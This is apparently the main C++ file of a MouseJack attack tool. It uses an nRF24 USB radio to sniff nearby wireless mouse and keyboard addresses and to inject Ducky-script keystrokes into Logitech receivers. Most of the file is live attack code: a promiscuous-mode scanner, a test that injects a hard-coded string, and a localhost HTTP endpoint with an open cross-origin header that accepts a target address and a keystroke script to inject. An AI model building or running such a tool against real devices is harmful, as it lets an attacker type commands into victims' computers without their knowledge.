
#include "stdafx.h"
#include <Winsock2.h>
#include <windows.h>

#include "nrf24.h"

#include <lusb0_usb.h>
#pragma comment(lib, "libusb.lib")

#include "MouseJack.h"
#include "DuckyParser.h"

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <winsock2.h>
#include "httplib.h"
#include <iostream>


void start_http_server() {
	using namespace httplib;
	std::cout << __FUNCTION__ << std::endl;
	Server svr;
	static DuckyParser Parser;
	
	static MouseJack mouseJack = MouseJack();
	
	svr.Get("/", [&](const Request& req, Response& res) {
		res.set_content("", "text/plain");
	});

	svr.Post("/find", [&](const Request& req, Response& res) {
		std::string straddress = req.get_param_value("address");
		std::string address = MouseJack::from_display(straddress);
		int channel = mouseJack.find_channel(address);
		printf("channel:%d\r\n", channel);
		char result[0x100] = { 0 };
		sprintf_s(result, "find_channel:%d", channel);

		res.set_header("Access-Control-Allow-Origin", "*");
		res.set_content(result, "text/plain");
	});

	svr.Post("/input", [&](const Request& req, Response& res) {
		std::cout << req.body << std::endl;
		std::string straddress = req.get_param_value("address");
		std::string key = req.get_param_value("key");

		std::vector<blank_entry> attack;
		attack = Parser.parse(key);
		mouseJack.sniffer_mode(straddress);
		HidLogitech hid;
		int channel = -1;
		if (channel == -1) {
			std::string address = MouseJack::from_display(straddress);
			channel = mouseJack.find_channel(address);
			if (channel == -1) {
				for (int i = 0; i < 5; i++)
				{
					channel = mouseJack.find_channel(address);
					if (channel != -1) {
						break;
					}
				}
			}
			if (channel == -1) {
				printf("find_channel error\r\n");
				return;
			}
			mouseJack.set_channel(channel);
		}
		
		if (channel == -1) {
			printf("find_channel:%d\r\n", channel);
		}

		std::vector<blank_entry> tmp_attack = attack;
		mouseJack.attack(hid, tmp_attack);

		res.set_header("Access-Control-Allow-Origin", "*");	
		res.set_content("input", "text/plain");
	});

	svr.listen("127.0.0.1", 5000);
}


void test_scan_device() {
	nrf24 obj_nrf24 = nrf24();
	obj_nrf24.enable_lna();
	obj_nrf24.enter_promiscuous_mode();

	DWORD scan_timeout = 5000;
	DWORD dwell_time = 100;


	while (true)
	{
		DWORD last_tune = GetTickCount();
		DWORD start_time = GetTickCount();

		int channel = 2;
		while ((GetTickCount() - start_time) < scan_timeout)
		{
			if ((GetTickCount() - last_tune) > dwell_time) {
				obj_nrf24.set_channel(channel);
				channel++;
				last_tune = GetTickCount();
			}
			std::string receive_payload = obj_nrf24.receive_payload();
			if (!receive_payload.empty() && receive_payload.size() > 4) {
				std::string device_address;
				for (int i = 0; i < 5; i++)
				{
					char addr[10] = { 0 };
					sprintf_s(addr, "%02X", (unsigned char)receive_payload.data()[i]);
					device_address.append(addr);
					if (i == 4) {
						break;;
					}
					device_address.append(":");

				}
				std::string recv_data;
				for (size_t i = 5; i < receive_payload.size(); i++)
				{
					char data[10] = { 0 };
					sprintf_s(data, "%02X ", (unsigned char)receive_payload.data()[i]);
					recv_data.append(data);
					if (i == receive_payload.size()) {
						break;
					}
				}
				printf("device:%s data:%s\r\n", device_address.c_str(), recv_data.data());
			}
		}
	}
}

void test_attack() {

	DuckyParser Parser;
	std::vector<blank_entry> attack;
	attack = Parser.parse("STRING 123456abcdef");

	HidLogitech hid;

	MouseJack mouseJack = MouseJack();

	std::string address = MouseJack::from_display("11:22:33:44:55");
	int channel = mouseJack.find_channel(address);
	printf("channel:%d\r\n", channel);

	
	std::vector<blank_entry> tmp_attack = attack;
	mouseJack.attack(hid, tmp_attack);
}

int _tmain(int argc, _TCHAR* argv[])
{
	
	start_http_server();
	
	return 0;
}

